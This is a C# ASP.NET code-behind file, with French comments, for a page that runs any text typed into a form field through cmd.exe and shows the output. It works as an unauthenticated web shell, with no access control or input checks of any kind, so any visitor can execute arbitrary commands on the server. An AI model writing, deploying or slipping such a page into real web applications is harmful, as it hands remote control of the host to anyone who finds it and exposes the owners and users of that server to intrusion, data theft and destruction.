using System;
using System.Diagnostics;

public partial class ExecuterCommande : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            // Afficher le formulaire pour entrer la commande à exécuter
            CommandePanel.Visible = true;
            ResultatPanel.Visible = false;
        }
    }

    protected void Executer_Click(object sender, EventArgs e)
    {
        string commande = CommandeTextBox.Text.Trim();

        try
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "cmd.exe"; // Command Prompt
            startInfo.Arguments = "/C " + commande; // "/C" pour exécuter la commande et fermer la fenêtre après

            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;

            using (Process process = new Process())
            {
                process.StartInfo = startInfo;
                process.Start();

                string result = process.StandardOutput.ReadToEnd();

                // Afficher le résultat de la commande
                ResultatLabel.Text = result;
                ResultatPanel.Visible = true;
                CommandePanel.Visible = false;
            }
        }
        catch (Exception ex)
        {
            ResultatLabel.Text = "Une erreur s'est produite : " + ex.Message;
            ResultatPanel.Visible = true;
            CommandePanel.Visible = false;
        }
    }
}